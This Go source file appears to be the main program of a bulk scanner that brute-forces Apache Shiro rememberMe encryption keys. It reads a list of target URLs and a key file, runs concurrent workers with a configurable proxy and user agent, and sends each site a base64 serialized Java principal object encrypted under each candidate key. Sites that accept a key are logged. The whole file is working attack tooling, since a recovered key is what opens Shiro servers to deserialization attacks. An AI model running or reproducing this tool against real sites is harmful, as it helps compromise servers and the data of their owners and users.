package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"os"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

func GetCommandArgs() {
	flag.StringVar(&UserAgent, "ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "User-Agent")
	flag.StringVar(&UrlFile, "f", "", "Target urls")
	flag.StringVar(&Method, "m", "GET", "Request Method")
	flag.StringVar(&PostContent, "content", "", "POST Method Content")
	flag.IntVar(&Timeout, "timeout", 3, "Request timeout time(s)")
	flag.IntVar(&Interval, "interval", 0, "Each request interval time(s)")
	flag.StringVar(&HttpProxy, "proxy", "", "Set up http proxy e.g. http://127.0.0.1:8080")
	flag.StringVar(&SKey, "k", "", "Specify the keys file")
	flag.StringVar(&AesMode, "mode", "", "Specify CBC or GCM encryption mode")
	flag.IntVar(&t, "t", 50, "Number of goroutines")
	flag.StringVar(&CheckContent, "chk", "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==", "Check Content")
	flag.StringVar(&NRemeberMe, "rm", "rememberMe", "Name of rememberMe")
	flag.StringVar(&OutPutfile, "o", "", "out filename")
	flag.Parse()
}

var outchan = make(chan string)

func StartTask(TargetUrl string) {

	if !ShiroCheck(TargetUrl) {
		_, result := KeyCheck(TargetUrl)
		outchan <- fmt.Sprintln(TargetUrl, ": \n", result)
	} else {
		outchan <- fmt.Sprintln(TargetUrl, ": ", "Shiro not exist!")
	}
}
func ShiroCheck(TargetUrl string) bool {
	ok, _ := HttpRequest("wotaifu", TargetUrl)
	return ok
}
func KeyCheck(TargetUrl string) (bool, string) {
	Content, _ := base64.StdEncoding.DecodeString(CheckContent)
	isFind, Result := false, ""

	isFind = false
	for i := range ShiroKeys {
		time.Sleep(time.Duration(Interval) * time.Second)
		isFind, Result = FindTheKey(ShiroKeys[i], Content, TargetUrl)
		if isFind {
			break
		}
	}
	return isFind, Result
}

func main() {
	GetCommandArgs()
	if UrlFile != "" {

		if SKey != "" {
			KeyF, err := os.Open(SKey)
			if err != nil {
				panic(err)
			}
			defer KeyF.Close()
			krd := bufio.NewReader(KeyF)
			for {
				UnFormatted, _, err := krd.ReadLine()
				if err == io.EOF {
					break
				}
				if len(UnFormatted) > 0 {
					ShiroKeys = append(ShiroKeys, string(UnFormatted))
				}

			}
		}
		//work goroutines
		var workurl = make(chan string)
		for i := 0; i < t; i++ {
			go func() {
				for url := range workurl {
					StartTask(url)
					wg.Done()
				}
			}()
		}
		//out goroutines
		var outf *os.File
		var err error
		if OutPutfile != "" {
			outf, err = os.OpenFile(OutPutfile, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("[Error] OutFile (-o) must be specified.")
				os.Exit(1)
			}
			defer outf.Close()
		}
		go func() {
			for outStr := range outchan {
				fmt.Print(outStr)
				if outf != nil {
					outf.WriteString(outStr)
					outf.Sync()
				}
			}
		}()

		UrlF, err := os.Open(UrlFile)
		if err != nil {
			panic(err)
		}
		defer UrlF.Close()
		rd := bufio.NewReader(UrlF)
		startTime := time.Now()

		for {
			UnFormatted, _, err := rd.ReadLine()
			if err == io.EOF {
				break
			}
			TargetUrl := string(UnFormatted)
			if !strings.Contains(TargetUrl, "http://") && !strings.Contains(TargetUrl, "https://") {
				TargetUrl = "https://" + TargetUrl
			}
			wg.Add(1)
			workurl <- TargetUrl

		}
		wg.Wait()
		endTime := time.Since(startTime)
		fmt.Println("Done! Time used:", int(endTime.Minutes()), "m", int(endTime.Seconds())%60, "s")
	} else {
		flag.Usage()
		fmt.Println("[Error] UrlFile (-f) must be specified.")
		os.Exit(1)
	}
}
